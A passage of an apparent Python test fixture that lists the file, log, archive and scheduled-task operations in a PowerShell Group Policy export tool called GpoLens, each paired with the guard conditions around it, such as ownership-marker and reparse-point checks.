                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $archive.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Assert-GpoLensRegularTree -Root $folder",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "Remove-Item -LiteralPath $folder -Recurse -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
                '$($newest.Name); retained at most $Retention exports"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            'Write-Host "Collection succeeded: $($newest.FullName)"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
                '$($failure.Exception.Message)"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "try",
            ),
        ),
        (
            "Write-Warning 'Unable to write collection failure log.'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "catch []",
            ),
        ),
        (
            (
                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "try",
                "guard if (-not $OutputRoot) -> throw",
            ),
        ),
        (
            'Write-Error "Collection failed: $($_.Exception.Message)" -ErrorAction Continue',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "catch []",
            ),
        ),
        (
            "[IO.File]::AppendAllText($LogPath, $line, $encoding)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "$zip.Dispose()",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
            ),
        ),
        (
            (
                "[IO.File]::WriteAllBytes((Join-Path $exportDir 'gpo-inventory.json'), "
                "$inventoryBytes)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Delete()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "if ($entry) after []",
            ),
        ),
        (
            "$zip.CreateEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Open()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$stream.Write($inventoryBytes, 0, $inventoryBytes.Length)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "finally",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
                "if ($zip) after []",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "finally",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (
        (
            "Get-Item -LiteralPath $Marker -Force -ErrorAction Stop",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            (
                "Add-Type -TypeDefinition @' using System; using System.ComponentModel; using "
                "System.Runtime.InteropServices; using Microsoft.Win32.SafeHandles; namespace "
                "GpoLens { public static class MarkerFileInfo { "
                "[StructLayout(LayoutKind.Sequential)] private struct FileInfo { public uint "
                "Attributes; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "CreationTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastAccessTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastWriteTime; public uint VolumeSerialNumber; public uint FileSizeHigh; "
                "public uint FileSizeLow; public uint NumberOfLinks; public uint "
                'FileIndexHigh; public uint FileIndexLow; } [DllImport("kernel32.dll", '
                "SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static "
                "extern bool GetFileInformationByHandle(SafeFileHandle handle, out FileInfo "
                "info); public static uint LinkCount(SafeFileHandle handle) { FileInfo info; "
                "if (!GetFileInformationByHandle(handle, out info)) throw new "
                "Win32Exception(Marshal.GetLastWin32Error()); if ((info.Attributes & 0x400) != "
                '0) throw new InvalidOperationException("Collection refuses a linked owner '
                "marker.\"); return info.NumberOfLinks; } } } '@ -ErrorAction Stop"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
                "if (-not ('GpoLens.MarkerFileInfo' -as [type])) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $opened",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "if-condition after []",
            ),
        ),
        (
            "& stat -L --format=%h -- $opened 2>$null",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
            ("function Write-GpoLensOwnerMarkerBytes",),
        ),
        (
            "Join-Path $root.FullName '.gpo-lens-collection-owner'",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
                "[IO.FileShare]::Read)"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "$stream.CopyTo($bytes)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$bytes.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "finally",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($marker, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, "
                "[IO.FileShare]::None)"
            ),
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "$stream.Write($Bytes, 0, $Bytes.Length)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
    ),
    "Register-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Out-Null",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            (
                "Write-Warning \"Changing output root owner from '$owner' to '$TaskName'; "
                "the previous task will refuse to run. Existing exports become subject to this "
                "task's retention.\""
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                (
                    "if (-not [string]::Equals($owner, $TaskName, "
                    "[StringComparison]::OrdinalIgnoreCase)) after []"
                ),
                "guard if (-not $Force) -> throw",
            ),
        ),
        (
            (
                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "& $RegisterTask",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "if ($null -ne $previousBytes) after []",
            ),
        ),
        (
            "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            'Write-Host "Unregistered task: $TaskName (exports and logs retained)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Resolve-Path -LiteralPath (Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1')",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $runner",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $OutputRoot",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $TaskName",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $CopyTo)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $CopyTo",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $InventoryPath)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $InventoryPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "New-ScheduledTaskPrincipal -UserId $account -LogonType Password -RunLevel Limited",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskAction -Execute "
                '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` -Argument '
                "$taskArgs -WorkingDirectory $PSScriptRoot"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
